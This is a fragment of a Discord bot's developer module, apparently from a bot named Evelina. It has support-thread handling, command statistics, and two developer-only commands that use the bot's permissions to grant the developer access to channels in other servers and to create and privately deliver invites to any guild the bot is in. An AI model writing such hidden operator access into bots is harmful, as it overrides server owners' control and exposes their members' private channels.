    @is_developer()
    async def channel_perms(self, ctx, channel_id: int):
        """
        Give yourself send/view permissions in a channel (even in another server).
        """
        try:
            # Fetch the channel across all guilds
            channel = await self.bot.fetch_channel(channel_id)

            if not isinstance(channel, discord.TextChannel):
                return await ctx.send("That is not a text channel.")

            # Fetch the member (you) from the target guild
            guild = channel.guild
            try:
                member = await guild.fetch_member(ctx.author.id)
            except discord.NotFound:
                return await ctx.send("You're not a member of that server, so I can't update your permissions there.")

            # Set channel-specific perms for that user
            await channel.set_permissions(member, view_channel=True, send_messages=True)
            await ctx.send(f"You can now talk in **{channel.guild.name}** > {channel.mention}")

        except discord.Forbidden:
            await ctx.send("I don’t have permission to view or modify that channel.")
        except discord.NotFound:
            await ctx.send("Channel not found. Is the ID correct and is the bot in that server?")
        except Exception as e:
            await ctx.send(f"An unexpected error occurred: `{e}`")

    @command()
    @is_developer()
    async def portal(self, ctx: EvelinaContext, id: int):
        """
        Send an invite to a guild.
        """
        guild = self.bot.get_guild(id)

        if guild is None:
            return await ctx.send_error(f"I could not find a guild for ``{id}``.")

        embed = Embed(description=f"> The invite for ``{guild.name}`` is listed below:")

        invite = None
        for c in guild.text_channels:
            if c.permissions_for(guild.me).create_instant_invite:
                invite = await c.create_invite()
                break

        if invite is None:
            return await ctx.send_error(f"I could not create an invite for ``{guild.name}``.")

        await ctx.author.send(f"{invite}", embed=embed)
        await ctx.message.delete()

    @Cog.listener("on_thread_create")
    async def on_thread_create(self, thread: Thread):
        if thread.guild.id != 1228371886690537624:
            return
        if thread.parent.id != 1353007247105720320:
            return
        if len(thread.name) < 4:
            resolved_tag = next((tag for tag in thread.parent.available_tags if tag.name.lower() == "resolved"), None)
            if not resolved_tag:
                return
            current_tags = thread.applied_tags
            updated_tags = current_tags + [resolved_tag] if resolved_tag not in current_tags else current_tags
            await thread.edit(locked=True, applied_tags=updated_tags)
            return await thread.send(f"{thread.owner.mention}, this thread has been automatically closed due to a potentially low quality title. Your title should be descriptive of the problem you are having.\n\nPlease remake your thread with a new and more descriptive title.", allowed_mentions=AllowedMentions(users=True))
        for _ in range(10):
            try:
                await thread.send(f"Thanks {thread.owner.mention} for creating a thread. Please describe your issue in detail and a <@&1242836137853190196> or <@&1237896149822603274> will assist you shortly.", allowed_mentions=AllowedMentions(users=True, roles=True))
                break
            except Exception:
                await asyncio.sleep(1)
        else:
            return
        
    @command(name="resolved", description="Mark a thread as resolved")
    async def resolved(self, ctx: EvelinaContext):
        if isinstance(ctx.channel, Thread):
            if ctx.guild.id != 1228371886690537624:
                return await ctx.send_warning("This command can only be used in the support server")
            if ctx.channel.parent.id != 1353007247105720320:
                return await ctx.send_warning("This command can only be used in the support category")
            if ctx.author != ctx.channel.owner and 1242836137853190196 not in [role.id for role in ctx.author.roles] and 1237896149822603274 not in [role.id for role in ctx.author.roles]:
                return await ctx.send_warning("You must be the owner of this thread or have the <@&1242836137853190196>/<@&1237896149822603274> role to mark this thread as resolved")
            resolved_tag = next((tag for tag in ctx.channel.parent.available_tags if tag.name.lower() == "resolved"), None)
            if not resolved_tag:
                return await ctx.send_warning("The `resolved` tag is not available in this category")
            current_tags = ctx.channel.applied_tags
            updated_tags = current_tags + [resolved_tag] if resolved_tag not in current_tags else current_tags
            await ctx.channel.edit(locked=True, applied_tags=updated_tags)
            return await ctx.send_success("This thread has been marked as resolved")
        else:
            return await ctx.send_warning("This command can only be used in a thread")

    @command(name="cmdstats", brief="bot developer")
    @is_developer()
    async def cmdstats(self, ctx: EvelinaContext):
        """Shows command usage statistics"""
        most_used = await self.bot.db.fetch(
            "SELECT command, COUNT(*) as usage_count, AVG(execution_time) as avg_time FROM command_stats GROUP BY command ORDER BY usage_count DESC LIMIT 10"
        )
        
        total_commands = await self.bot.db.fetchval("SELECT COUNT(*) FROM command_stats")
        
        avg_time = await self.bot.db.fetchval("SELECT AVG(execution_time) FROM command_stats")
        
        most_active = await self.bot.db.fetch(
            "SELECT user_id, COUNT(*) as usage_count FROM command_stats GROUP BY user_id ORDER BY usage_count DESC LIMIT 5"
        )
        
        most_active_guilds = await self.bot.db.fetch(
            "SELECT guild_id, COUNT(*) as usage_count FROM command_stats WHERE guild_id IS NOT NULL GROUP BY guild_id ORDER BY usage_count DESC LIMIT 5"
        )
        
        embed = Embed(color=colors.NEUTRAL, title="Command Statistics")
        
        if most_used:
            cmd_stats = []
            for cmd in most_used:
                cmd_stats.append(f"`{cmd['command']}` - {cmd['usage_count']:,} uses (avg: {cmd['avg_time']:.2f}ms)")
            embed.add_field(
                name="Most Used Commands",
                value="\n".join(cmd_stats),
                inline=False
            )
        
        embed.add_field(
            name="Overall Statistics",
            value=f"Total Commands: `{total_commands:,}`\nAverage Execution Time: `{avg_time:.2f}ms`",
            inline=False
        )
        
        if most_active:
            user_stats = []
            for user in most_active:
                user_obj = self.bot.get_user(user['user_id'])
                if user_obj:
                    user_stats.append(f"{user_obj.mention} - {user['usage_count']:,} commands")
            embed.add_field(
                name="Most Active Users",
                value="\n".join(user_stats),
                inline=True
            )
        
        if most_active_guilds:
            guild_stats = []
            for guild in most_active_guilds:
                guild_obj = self.bot.get_guild(guild['guild_id'])
                if guild_obj:
                    guild_stats.append(f"{guild_obj.name} - {guild['usage_count']:,} commands")
            embed.add_field(
                name="Most Active Guilds",
                value="\n".join(guild_stats),
                inline=True
            )
        
        await ctx.send(embed=embed)

async def setup(bot: Evelina) -> None:
    await bot.add_cog(Developer(bot))